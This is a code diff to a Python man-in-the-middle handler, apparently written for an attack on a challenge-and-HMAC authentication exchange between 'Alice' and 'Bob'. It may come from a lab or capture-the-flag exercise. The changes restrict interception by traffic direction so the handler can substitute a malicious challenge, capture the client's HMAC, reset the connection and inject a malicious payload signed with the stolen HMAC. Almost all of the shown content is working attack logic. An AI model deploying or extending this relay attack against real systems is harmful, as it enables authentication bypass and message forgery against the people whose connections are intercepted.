@@ -112,6 +112,7 @@ class MitmAttackHandler:
             logging.info(f"  Raw data hex: {self.hex_dump(original_data)}")
             logging.info(f"  State: {self.global_state.state['phase']}")
             logging.info(f"  Active: {self.global_state.state['active']}")
+            logging.info(f"  Direction: {self.direction_name}")
             
         # Detect challenge from server (Bob) - try multiple formats
         challenge_detected = False
@@ -131,7 +132,8 @@ class MitmAttackHandler:
                 challenge_detected = True
                 
         if challenge_detected:
-            if not self.global_state.state['active']:
+            # Only handle challenges in bob_to_alice direction (when Bob sends to Alice)
+            if self.direction_name == 'bob_to_alice' and not self.global_state.state['active']:
                 self.global_state.state['active'] = True
                 self.global_state.state['phase'] = 'waiting_hmac'
                 self.global_state.state['original_challenge'] = original_data
@@ -166,9 +168,15 @@ class MitmAttackHandler:
                 if self.attack_log:
                     logging.info(f"[MITM] *** Sent malicious challenge to client ***")
                 return False
+            else:
+                # In alice_to_bob direction or already active, forward normally
+                if self.attack_log:
+                    logging.info(f"[MITM] Forwarding challenge normally (direction: {self.direction_name}, active: {self.global_state.state['active']})")
+                return True
                 
         # Detect HMAC from client (Alice) - this should be the response to our malicious challenge
-        elif (self.global_state.state['active'] and 
+        elif (self.direction_name == 'alice_to_bob' and 
+              self.global_state.state['active'] and 
               self.global_state.state['phase'] == 'waiting_hmac' and 
               isinstance(raw_msg, (bytes, str))):
             # Check if this looks like an HMAC response (not a challenge or welcome)
@@ -186,7 +194,8 @@ class MitmAttackHandler:
                 return "RST_CONNECTION"
                 
         # After reconnect, forward Bob's new challenge normally (don't replay old one)
-        elif (self.global_state.state['active'] and 
+        elif (self.direction_name == 'bob_to_alice' and
+              self.global_state.state['active'] and 
               self.global_state.state['phase'] == 'waiting_reconnect' and 
               isinstance(raw_msg, (bytes, str))):
             # Check if this is a new challenge from Bob after reconnect
@@ -211,7 +220,9 @@ class MitmAttackHandler:
                 return False
             
         # After handshake, inject malicious payload with captured HMAC
-        elif self.global_state.state['active'] and self.global_state.state['phase'] == 'waiting_welcome':
+        elif (self.direction_name == 'alice_to_bob' and
+              self.global_state.state['active'] and 
+              self.global_state.state['phase'] == 'waiting_welcome'):
             welcome_detected = False
             if isinstance(raw_msg, str) and raw_msg.startswith('#WELCOME#'):
                 welcome_detected = True
